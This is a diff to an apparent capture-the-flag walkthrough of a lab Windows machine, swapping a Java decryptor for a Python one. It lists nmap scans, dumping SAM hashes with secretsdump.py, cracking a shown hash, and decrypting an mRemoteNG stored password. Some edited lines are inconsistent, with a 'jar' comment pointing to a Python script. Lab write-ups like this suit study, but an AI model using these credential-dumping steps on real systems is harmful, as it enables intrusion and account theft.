@@ -23,8 +23,8 @@
 
 ### 📡 Recon
 ```bash
-nmap -sT -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.134
-nmap -sC -sV -p 22,135,139,445 -oA scans/nmap-tcpscripts 10.10.10.134
+nmap -sT -p- --min-rate 10000 10.10.10.134
+nmap -sCV -p 22,135,139,445 10.10.10.134
 ```
 
 ### 📁 [SMB](SMB.md) Enumeration
@@ -55,7 +55,7 @@ cd /mnt2/Windows/System32/config
 secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
 ```
 
-### 🔐 Crack Password
+### 🔐 [Crack Password](https://crackstation.net/)
 ```bash
 # Use https://crackstation.net/ on hash 26112010952d963c8dc4217daec986d9
 ```
@@ -78,10 +78,10 @@ cd C:\Users\L4mpje\AppData\Roaming\mRemoteNG
 type confCons.xml
 ```
 
-### 🔓 Decrypt Password via Java
+### 🔓 [Decrypt Password via Python](https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng_decrypt.py)
 ```bash
-# (Download jar from: https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/decipher_mremoteng.jar)
-java -jar decipher_mremoteng.jar V22XaC5eW4epRxRgXEM5RjuQe2UNrHaZSGMUenOvA1Cit/z3v1fUfZmGMglsiaICSus+bOwJQ/4AnYAt2AeE8g==
+# (Download jar from: https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng_decrypt.py)
+python3 mremoteng_decrypt.py -f FILE [-p CUSTOM_PASSWORD] V22XaC5eW4epRxRgXEM5RjuQe2UNrHaZSGMUenOvA1Cit/z3v1fUfZmGMglsiaICSus+bOwJQ/4AnYAt2AeE8g==
 ```
 
 ### 🔓 Decrypt via Python Script
